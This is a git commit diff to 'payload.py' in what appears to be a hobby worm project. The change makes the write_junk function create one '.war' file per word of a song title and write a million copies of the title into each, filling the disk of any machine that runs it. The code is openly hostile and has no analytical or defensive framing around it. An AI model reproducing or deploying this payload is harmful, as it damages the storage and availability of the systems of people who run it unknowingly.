b5b02365111f62e15f24a828ed046cd56d6be28d
Travis Smith <travissmith94@hotmail.com>
2016-03-17 22:22:54 -0500

    More easily manageable payload

--- worm/front-end/payload.py
+++ worm/front-end/payload.py
@@ -2,8 +2,8 @@ def song():
     return "There's A War Going On For Your Mind"
 
 def write_junk():
-    for word in song():
-        f = open(word , 'w')
+    for word in song().split():
+        f = open(word + '.war' , 'w')
         f.write(1000000 * song())
     
 if __name__ == '__main__':
